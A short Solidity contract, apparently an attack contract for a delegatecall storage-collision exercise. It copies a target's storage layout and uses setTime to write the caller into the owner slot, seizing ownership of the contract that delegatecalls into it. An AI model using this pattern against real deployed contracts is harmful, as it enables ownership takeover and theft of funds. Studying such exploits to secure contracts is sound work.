contract Aack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _owner) external {
        owner = msg.sender;
    }
}
